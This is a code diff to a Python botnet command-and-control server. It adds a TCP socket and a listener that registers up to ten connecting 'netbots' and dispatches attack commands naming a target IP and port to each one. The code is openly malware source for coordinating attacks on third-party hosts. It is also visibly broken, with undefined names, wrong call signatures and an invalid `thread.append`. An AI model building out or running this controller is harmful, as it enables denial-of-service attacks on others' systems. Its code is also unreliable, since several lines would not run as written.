@@ -15,7 +15,7 @@ netbots: List[netbot] = []
 
 class Server:
     def __init__(self):
-        self.socketfd = -1
+        self.socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         self.attacking = False
         self.attack = "None"
@@ -69,11 +69,11 @@ class Server:
                 else:
                     message = f"{self.attack}_{self.target_ip}_{self.target_port}"
 
-                send(netbot.id, message.encode(), len(message),0)
+                socketfd.send(netbot.id, message.encode(), len(message),0)
 
     def close_connected_sockets():
         for netbot in netbots:
-            close(netbot.id)
+            socketfd.close(netbot.id)
     
     def list_bots():
         os.system("clear")
@@ -158,5 +158,19 @@ class Server:
             print(f"Error: {e}", flush=True)
             i.close()
     
-    def connection_listener():    
+    def connection_listener(i):
+        while len(netbots) != 10:
+            client_socket, client_address = i.accept()
+            client_ip = client_address[0]
+            print(f"Client connected: {client_ip}\tTotal Bots Connected: {len(netbots)}")
+
+            # 将客户端信息添加到netbots列表
+            netbot = netbot(id = client_socket.fileno(), start = time.time(), ip_address = client_ip)
+            netbots.append(netbot)
+
+            # 创建并启动
+            thread = threading.Thread(target=threaded, args=(client_socket,))
+            thread.daemon = True # 设置为守护线程
+            thread.append(thread)
+            thread.start()    
     
